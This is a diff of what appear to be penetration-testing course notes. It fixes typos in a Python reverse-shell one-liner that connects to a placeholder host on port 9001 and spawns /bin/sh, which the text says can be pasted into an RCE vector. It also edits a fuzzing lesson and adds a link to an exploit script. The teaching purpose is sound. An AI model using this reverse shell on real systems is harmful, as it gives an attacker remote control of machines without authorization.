@@ -566,7 +566,7 @@ ___
   * On cheatsheets you will see this compressed to just one long line.  
 
     ```python
-    python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.HOST.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(), 2); os.system("/bin/sh")'
+    python -c 'import os, socket; s=socket.socket(); s.connect((\"YOUR.HOST.IP.ADDRESS\",9001)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.system(\"/bin/sh\")'
     ```
 
   * This is so you can easily copy and paste it in your RCE vector!
@@ -628,7 +628,7 @@ sequences.
 
 ___
 
-## Lesson - Module 2 — Lesson 1 3: Fuzzing
+## Lesson - Module 2 — Lesson 13: Fuzzing
 
 ### Lesson 13 Overview
 
@@ -750,7 +750,8 @@ ___
   * Amap is an Application MAPper
   * Deeper dive than some other tools  
 
-![Manual Fuzzing](./Files/Images/Lesson13/manfuzz6.png)
+![Manual Fuzzing](./Files/Images/Lesson13/manfuzz6.png)  
+
 * Let's connect and find more
   * Using netcat we can establish a raw connection to this port/service  
   ![Manual Fuzzing](./Files/Images/Lesson13/manfuzz7.png)
@@ -862,7 +863,7 @@ ___
 
 ___
 
-<answer to be sumbitted>
+[Module 2, Lesson 12 Script File](./Scripts/Python/Mod2L12-Python-and-ExploitDB.py)
 
 ___
 
